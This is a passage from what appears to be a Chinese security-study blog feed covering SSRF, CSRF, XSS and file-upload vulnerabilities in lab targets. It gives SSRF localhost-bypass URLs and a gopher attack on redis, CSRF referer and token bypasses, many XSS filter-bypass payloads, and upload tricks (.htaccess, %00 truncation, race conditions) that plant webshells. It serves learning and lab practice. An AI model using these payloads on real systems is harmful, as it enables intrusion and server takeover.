class="hljs-comment">//0x7F.0.0.1/flag.php</span><br>八进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0177.0.0.1/flag.php</span><br><span class="hljs-number">10</span> 进制整数格式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//2130706433/flag.php</span><br><span class="hljs-number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="hljs-number">0</span>x<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F000001/flag.php</span><br>还有一种特殊的省略模式<br>    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>写成<span class="hljs-number">127.1</span><br>用CIDR绕过localhost<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.127.127.127/flag.php</span><br>还有很多方式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0/flag.php</span><br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0.0.0.0/flag.php</span><br></code></pre></td></tr></table></figure><ol start="3"><li>域名解析IP绕过</li></ol><p>将自己拥有的域名添加一个记录解析为127.0.0.1。</p><p>如：test.xxx.com -&gt; 127.0.0.1</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://test.xxx.com/flag.php<br></code></pre></td></tr></table></figure><ol start="4"><li>利用重定向解析绕过</li></ol><p>在自己服务器上写一个跳转页面代码如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://服务器ip/xx.php<br></code></pre></td></tr></table></figure><ol start="5"><li>匹配且不影响写法解析</li></ol><p>正则匹配规则 (url 中必须包含) &#x2F;http://ctf.. * show$&#x2F;i</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure><ol start="6"><li>利用gopher协议打服务</li></ol><p>有一些前提条件，比如redis未授权、mysql无密码等。<br><img src="/../images/Pasted%20image%2020241208212140.png"></p><p><img src="/../images/Pasted%20image%2020241208212714.png"></p><p>利用工具：<a href="https://github.com/tarunkant/Gopherus" title="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="/../images/Pasted%20image%2020241208213030.png"></p><p>注意工具生成的url,要进行一次url编码，因为服务器会自动解一次码。</p><p>执行payload后就生成了x.php。<br><img src="/../images/Pasted%20image%2020241208213141.png"></p><h1 id="无回显的解决办法"><a href="#无回显的解决办法" class="headerlink" title="无回显的解决办法"></a>无回显的解决办法</h1><ol><li>dnslog 外带</li></ol><p><a href="https://blog.csdn.net/weixin_39190897/article/details/117197126">浅析DNSlog在渗透测试中的实战技巧_xml +dnslog-CSDN博客</a></p><ol start="2"><li>反向连接</li></ol><p><img src="/../images/Pasted%20image%2020241208214638.png"></p><p><img src="/../images/Pasted%20image%2020241208214645.png"></p><p><img src="/../images/Pasted%20image%2020241208214655.png"></p><ol start="3"><li>正向连接</li></ol><p>一般RCE执行可以用这个方式，SSRF得用第一种方式，因为SSRF无法写文件。</p><p>写个文件在对方网站目录下，然后再去访问网站目录是否存在这个文件就能判断目标是否执行了RCE命令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://example.com/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-07T12:16:30.000Z</published>
    <updated>2024-12-09T08:33:22.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种利用用户在某网站的身份认证信息，通过伪造请求来执行恶意操作的攻击方式。</p><ol><li><p>受害者登录：受害者先登录一个网站（如网上银行、社交平台等），并且此时浏览器保存了该网站的登录认证信息（比如 cookie）。</p></li><li><p>攻击者构造恶意请求：攻击者构造一个恶意网页或链接，链接中包含一个目标网站的请求（如更改账户密码、转账等）。该请求看似合法，但实际上是恶意构造的。</p></li><li><p>受害者点击链接：受害者在不知情的情况下点击了攻击者诱导的链接，或访问了包含恶意请求的网页。</p></li><li><p>伪造请求被发送：由于受害者已经登录目标网站，浏览器会自动附带上该网站的 Cookie 等身份认证信息，目标网站接收到这个伪造的请求时，认为这个请求来自合法用户，从而执行了恶意操作。</p></li></ol><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ol><li><p>需要伪造请求数据包。</p></li><li><p>无过滤防护，或有过滤防护但可以绕过。</p></li><li><p>受害者触发 (钓鱼)。</p></li></ol><h1 id="无防护"><a href="#无防护" class="headerlink" title="无防护"></a>无防护</h1><p>演示靶场：发货 100 模板 T11 - 电子商城模板（PC）-&gt; 后台用户管理</p><p><img src="/../images/Pasted%20image%2020241208151356.png"></p><p>BurpSuite抓一个添加管理员的包：</p><p><img src="/../images/Pasted%20image%2020241208151519.png"></p><p>然后右键选择 -&gt;Engagement tools-&gt;Generate CSRF Poc-&gt;Options-&gt;Include auto-submit script</p><p>复制生成的html代码：</p><p><img src="/../images/Pasted%20image%2020241208151810.png"></p><p>将其放到攻击者网站目录：</p><p><img src="/../images/Pasted%20image%2020241208145310.png"></p><p>引诱目标人员在同一浏览器访问这个页面，即可攻击成功。</p><p><img src="/../images/Pasted%20image%2020241208151914.png"></p><p>此时在后台发现管理员已添加成功。</p><p><img src="/../images/Pasted%20image%2020241208152107.png"></p><p>若目标管理员未登录后台，或者后台 cookie 已经过期，需要重新登录，那么将无法完成攻击。</p><h1 id="有防护-Referer-同源"><a href="#有防护-Referer-同源" class="headerlink" title="有防护- Referer 同源"></a>有防护- Referer 同源</h1><p><img src="/../images/Pasted%20image%2020241208155904.png"></p><p>演示靶场：Zblog 后台用户管理</p><p><img src="/../images/Pasted%20image%2020241208160215.png"></p><p>按照上面步骤操作后，显示非法访问：<br><img src="/../images/Pasted%20image%2020241208160436.png"><br>查看网站源码，在 cmd.php 中找到了检测 referer 的函数 CheckIsRefererValid, 按住 Ctrl 点击，跳转到定义如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckHTTPRefererValid</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">global</span> <span class="hljs-variable">$bloghost</span>;<br>     <span class="hljs-variable">$referer</span> = <span class="hljs-title function_ invoke__">GetVars</span>(<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>, <span class="hljs-string">&#x27;SERVER&#x27;</span>);  <span class="hljs-comment">// 获取请求中的referer</span><br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$referer</span>) === <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>     <span class="hljs-variable">$s</span> = <span class="hljs-variable">$bloghost</span>;<br>     <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:80/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$s</span>);<br>     <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:443/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$s</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$referer</span>, <span class="hljs-variable">$s</span>) === <span class="hljs-literal">false</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> ​<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p><strong>绕过referer匹配的策略：</strong></p><p>目标网站：<a href="http://22.22.22.22/">http://22.22.22.22/</a><br>攻击者：<a href="http://11.11.11.11/">http://11.11.11.11/</a></p><ol><li>部分匹配</li></ol><p>如上面这个 zblog 靶场的 referer 检测就是 php 的 stripos 函数，该函数 stripos () 是查找字符串在另一字符串中第一次出现的位置，并且不区分大小写的。</p><p>此时将 referer 修改为这样即可绕过检测：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">11.11</span>.<span class="hljs-number">11.11</span><span class="hljs-regexp">/http:/</span><span class="hljs-regexp">/22.22.22.22/</span>add.html<br></code></pre></td></tr></table></figure><p>怎么构造这个 referer 呢？在你的网站下创建这样一个目录即可。这里讲思路，实际上实现不了这个，因为不能创建 http: &#x2F;&#x2F;这样的目录。</p><p>也可以针对不严谨的代码逻辑绕过。上面zblog 网站源码中，若 referer 为空也返回 true。有时候重新打开浏览器访问的时候就是没有 referer，所以不是代码有问题，只是逻辑不严谨。所以可以在add.html中设置referer为空。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>完全匹配</li></ol><p>只能配合文件上传漏洞（上传到目标网站目录，这时候 referer 肯定就是目标网站本身）和XSS漏洞（利用JS代码发送add.html）绕过。</p><h1 id="有防护-Token校验"><a href="#有防护-Token校验" class="headerlink" title="有防护-Token校验"></a>有防护-Token校验</h1><p><img src="/../images/Pasted%20image%2020241208172243.png"></p><p><strong>绕过策略（代码逻辑不严谨）：</strong></p><ol><li><p>将 Token 参数值复用<br>即一个 Token 可以一直使用或者使用多次。</p></li><li><p>将 Token 参数删除<br>不验证 Token 的时候。</p></li><li><p>将 Token 参数值置空<br>Token 为空的时候也可以通过验证的情况。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种利用用户在某网站的身份认证信息，通过伪造请求来执行恶意操</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞</title>
    <link href="http://example.com/2024/12/06/XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/06/XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-06T03:53:52.000Z</published>
    <updated>2024-12-09T08:33:46.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分类及原理"><a href="#分类及原理" class="headerlink" title="分类及原理"></a>分类及原理</h1><p><a href="https://blog.csdn.net/m0_51468027/article/details/122757024">跨站脚本攻击XSS（最全最细致的靶场实战）_xss靶场-CSDN博客</a></p><p>它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用XSS代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p><p>黑盒XSS手工分析：</p><ol><li>页面中显示的数据找可控的（有些是隐藏的）。</li><li>利用可控的地方发送JS代码看执行情况。</li><li>成功执行即XSS，不成功则分析显示的输出。</li><li>分析为什么不能执行（实体化、关键字被删除等）。</li></ol><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>攻击者构造一个恶意链接，诱导用户传播和打开 。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p><p><img src="/../images/Pasted%20image%2020241206212443.png"></p><p>劫持流量实现恶意跳转：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。</p><p><img src="/../images/Pasted%20image%2020241206212728.png"></p><p>真实的XSS攻击语句，需要考虑输入和输出的格式。</p><p>输入可能会有过滤，输出可能会有其他符号的拼接造成攻击语句执行失败。如下图：<br><img src="/../images/Pasted%20image%2020241206213150.png"></p><p>注意标签闭合，可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a><br><img src="/../images/Pasted%20image%2020241206214158.png"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。</p><p><img src="/../images/Pasted%20image%2020241206215512.png"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p><a href="https://www.freebuf.com/articles/web/306031.html">DOM型XSS - FreeBuf网络安全行业门户</a><br>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，大部分属于反射型。</p><p><img src="/../images/Pasted%20image%2020241206221436.png"><br>DOM就是一个树状的模型，你可以编写Javascript代码根据DOM一层一层的节点，去遍历&#x2F;获取&#x2F;修改对应的节点,对象,值。</p><blockquote><p>[!NOTE]<br> 可能触发DOM型XSS的属性:<br>document.referer属性<br>window.name属性<br>location属性<br>innerHTML属性<br>document.write属性</p></blockquote><h1 id="XSS-Lab-安全防御-XSSFilter"><a href="#XSS-Lab-安全防御-XSSFilter" class="headerlink" title="XSS-Lab(安全防御-XSSFilter)"></a>XSS-Lab(安全防御-XSSFilter)</h1><p>如何绕过过滤触发JS代码？</p><ol><li><p><strong>无过滤</strong><br><img src="/../images/Pasted%20image%2020241207102927.png"></p></li><li><p><strong>标签闭合</strong></p></li></ol><p>查看源码，发现<code>&lt;</code>和<code>&gt;</code>被HTML字符实体化。</p><p><img src="/../images/Pasted%20image%2020241207104336.png"></p><p>输入的payload被赋值给value且未被实体化，可以考虑闭合value的参数值，和sql注入原理相同。</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>单引号闭合并添加事件</strong></li></ol><p>发现value也被实体化。</p><p><img src="/../images/Pasted%20image%2020241207155933.png"></p><p>利用onfocus事件绕过：<br><img src="/../images/Pasted%20image%2020241207160659.png"></p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">&#x27; onfocus=javascript:alert() &#x27; <span class="hljs-comment">//注意空格</span><br></code></pre></td></tr></table></figure><p> 然后再点击输入框触发onfocus事件即可。</p><ol start="4"><li><strong>双引号闭合并添加事件</strong></li></ol><p>发现依旧实体化，且value删除了<code>&lt;</code>和<code>&gt;</code>。<br><img src="/../images/Pasted%20image%2020241207161509.png"></p><p>同样添加onfocus事件可以绕过，注意闭合方式是双引号。</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; onfocus=javascript:alert() &quot;</span> <span class="hljs-comment">//注意空格</span><br></code></pre></td></tr></table></figure><ol start="5"><li><strong>事件关键字过滤，利用其他标签调用，双引号闭合</strong></li></ol><p>实体化，script被添加下划线，onfocus同样也被添加下划线。</p><p><img src="/../images/Pasted%20image%2020241207161911.png"></p><p>因此我们可以换一个标签来执行js代码：</p><p><img src="/../images/Pasted%20image%2020241207162737.png"></p><p>href属性的意思是 当标签a被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><p>之后点击xss，触发a标签href属性即可。</p><p><strong>6. 大小写绕过</strong></p><p>发现href也被添加下划线：</p><p><img src="/../images/Pasted%20image%2020241207164347.png"></p><p>查看服务器端源码：<br><img src="/../images/Pasted%20image%2020241207164643.png"></p><p>str_replace不区分大小写，所以可以利用大小写绕过：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="7"><li><strong>双写绕过</strong></li></ol><p>发现关键字被删除：</p><p><img src="/../images/Pasted%20image%2020241207165338.png"></p><p>利用双写绕过：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">hrhrefef</span>=<span class="hljs-string">javascscriptript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="8"><li><strong>unicode编码绕过</strong></li></ol><p>输入的值被插入到<code>&lt;a&gt;</code>标签的<code>href</code>属性值中：</p><p><img src="/../images/Pasted%20image%2020241207173721.png"></p><p> href属性自动解析Unicode编码：<br> <br><img src="/../images/Pasted%20image%2020241207175413.png"></p><ol start="9"><li><strong>内容检测</strong></li></ol><p>发现不合法，猜测这里可能对url地址做了匹配。只有包含正常的url地址才能添加到href属性值。 </p><p><img src="/../images/Pasted%20image%2020241207180258.png"></p><p>查看源码：<br><img src="/../images/Pasted%20image%2020241207180418.png"></p><p>因此要向传入的值里面添加http:&#x2F;&#x2F;并用注释符注释掉否则会执行不了无法弹窗:</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">javascript:alert()<span class="hljs-regexp">//</span>http:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><p>此外还存在其他过滤，要将<code>javascript:alert()</code>进行unicode编码。</p><ol start="10"><li><strong>输入数据被隐藏</strong></li></ol><p><img src="/../images/Pasted%20image%2020241207181317.png"></p><p>查看源码，发现还有其他传参方法，且过滤了<code>&lt;</code>和<code>&gt;</code>：</p><p><img src="/../images/Pasted%20image%2020241207181500.png"></p><p>因为这里输入框被隐藏了，需要添加type&#x3D;”text”，构造payload：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>成功执行XSS：<br><img src="/../images/Pasted%20image%2020241207183505.png"></p><ol start="11"><li><strong>http头传值</strong></li></ol><p><img src="/../images/Pasted%20image%2020241207184312.png"></p><p>猜测第四个名为t_ref的input标签是http头referer的参数。</p><p>BurpSuite抓包，添加Referer头，payload为：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241207184947.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分类及原理&quot;&gt;&lt;a href=&quot;#分类及原理&quot; class=&quot;headerlink&quot; title=&quot;分类及原理&quot;&gt;&lt;/a&gt;分类及原理&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/m0_51468027/article/details</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://example.com/2024/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-11-23T11:06:56.000Z</published>
    <updated>2024-12-09T08:32:49.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端JS验证"><a href="#前端JS验证" class="headerlink" title="前端JS验证"></a>前端JS验证</h1><p>要么看源码，要么抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p><p><img src="/../images/Pasted%20image%2020241128163111.png"></p><p>直接将 shell.php 重命名为 shell.png 上传，抓包的时候再将文件名修改为 shell.php 即可绕过前端限制，成功上传 webshell。或者直接在浏览器上禁用 JS。</p><h1 id="htaccess-文件"><a href="#htaccess-文件" class="headerlink" title=".htaccess 文件"></a>.htaccess 文件</h1><p><img src="/../images/Pasted%20image%2020241128190903.png"></p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .png<br><span class="hljs-comment"># 把.png文件解析成php</span><br></code></pre></td></tr></table></figure><p>上传shell.php，抓包。<br><img src="/../images/Pasted%20image%2020241128204054.png"></p><p>文件名改成.htaccess，内容改成<code>AddType application/x-httpd-php .png</code> 。<br><img src="/../images/Pasted%20image%2020241128204150.png"></p><p>shell.php更改后缀名为.png再上传。<br><img src="/../images/Pasted%20image%2020241128204818.png"></p><p>成功上传后门。<br><img src="/../images/Pasted%20image%2020241128204935.png"></p><h1 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h1><p><img src="/../images/Pasted%20image%2020241129100728.png"></p><p>直接上传shell.php，抓包修改<code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型。</p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p><img src="/../images/Pasted%20image%2020241129101402.png"></p><p>上传shell.php，更改MIME，并在文件头部加上GIF89a:</p><p><img src="/../images/Pasted%20image%2020241129102056.png"></p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><p><img src="/../images/Pasted%20image%2020241129102313.png"></p><p>代码过滤不严：黑名单后缀设置为空，但是无递归，只检测一次，所以直接使用嵌套后缀：<code>shell.pphphp</code>。</p><h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p><img src="/../images/Pasted%20image%2020241129103724.png"></p><p>函数缺陷：<code>str_replace</code> 和 <code>str_ireplace</code> 都是 PHP 中用于字符串替换的函数，它们之间的区别在于<code>str_replace</code>区分大小写，只有完全匹配的字符串会被替换，这样很容易就被大小写绕过。</p><p>因为 Windows 环境下不区分大小写，所以更改后缀名为.PHp ，但是 Linux 区分大小写。</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>burpsuite抓包，发送到Intruder，php后缀添加载荷。点击Payloads，载入fuzzdbmaster项目中针对php后缀的字典。<br><img src="/../images/Pasted%20image%2020241129113732.png"></p><p>查看不同长度的响应，寻找可以绕过的后缀名。</p><h1 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h1><p><img src="/../images/Pasted%20image%2020241129104627.png"></p><p>抓包发现路径信息通过 GET 方式传递给后端，直接在路径后添加<code>/new.php%00</code>，这样保存的文件名就是这样的效果：</p><figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>htdocs<span class="hljs-regexp">/upload/</span><span class="hljs-keyword">new</span>.php%<span class="hljs-number">00</span>shell.jpg<br></code></pre></td></tr></table></figure><p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell。</p><p>以上是GET型00截断，在url上%00自动解码一次。如果是POST型00截断，就需要手工解码：</p><p><img src="/../images/Pasted%20image%2020241129111932.png"></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p><img src="/../images/Pasted%20image%2020241129114114.png"></p><p>源码有逻辑缺陷，是先上传再判断。所以在删除之前，访问上传的用来生成恶意shell的文件，创建一个新的shell文件。</p><p>上传shell.php，抓包，发送到Intruder。<br><img src="/../images/Pasted%20image%2020241129121113.png"></p><p>因为上传了服务器就会删除，所以要不断上传，以便抓取访问shell.php的数据包。<br><img src="/../images/Pasted%20image%2020241129122118.png"><br><img src="/../images/Pasted%20image%2020241129122142.png"></p><p>与此同时，相同操作不断访问&#x2F;upload&#x2F;shell.php。</p><p>访问&#x2F;upload&#x2F;xiao.php，发现已存在，生成webshell成功。<br><img src="/../images/Pasted%20image%2020241129122818.png"></p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><img src="/../images/Pasted%20image%2020241129123104.png"></p><p>准备一个gif，上传之后再导出。打开010Editor，对比两个文件内容：<br><img src="/../images/Pasted%20image%2020241129124726.png"></p><p>灰色部分就是内容一致的部分，把后门代码插入到灰色部分：</p><p><img src="/../images/Pasted%20image%2020241129131905.png"></p><p>上传之后复制图片链接，利用文件包含漏洞，可执行任意命令:<br><img src="/../images/Pasted%20image%2020241129132636.png"></p><h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p><img src="/../images/Pasted%20image%2020241129133014.png"></p><p>当 <code>$img_path</code> 可控的时候，将文件命名为<code>shell.php/.</code>，会把&#x2F;.忽略，就可以上传一个php文件：</p><p><img src="/../images/Pasted%20image%2020241129133400.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前端JS验证&quot;&gt;&lt;a href=&quot;#前端JS验证&quot; class=&quot;headerlink&quot; title=&quot;前端JS验证&quot;&gt;&lt;/a&gt;前端JS验证&lt;/h1&gt;&lt;p&gt;要么看源码，要么抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>基础知识</title>
    <link href="http://example.com/2024/11/22/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2024/11/22/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2024-11-22T08:20:16.000Z</published>
    <updated>2024-12-20T05:45:18.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p>流行的JS框架有Vue、NodeJS、jQuery、Angular等。</p><p>JS安全问题：</p><ol><li>源码泄漏</li><li>未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径</li><li>敏感key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</li><li>API接口安全&#x3D;（代码中加密提交参数传递，更多的URL路径）</li></ol><p>浏览器F12搜索关键词寻找泄露路径：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">src=  <br>path=  <br><span class="hljs-symbol">method:</span>“get”  <br>http.get(<span class="hljs-string">&quot;  </span><br><span class="hljs-string">method:“post”  </span><br><span class="hljs-string">http.post(&quot;</span>  <br><span class="hljs-variable">$.</span>ajax<br>[<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/service.httppost](http:/</span><span class="hljs-regexp">/service.httppost/</span>)<br>[<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/service.httpget](http:/</span><span class="hljs-regexp">/service.httpget/</span>)<br></code></pre></td></tr></table></figure><p>URLFinder-用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口。<br><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a>  </p><h1 id="蜜罐"><a href="#蜜罐" class="headerlink" 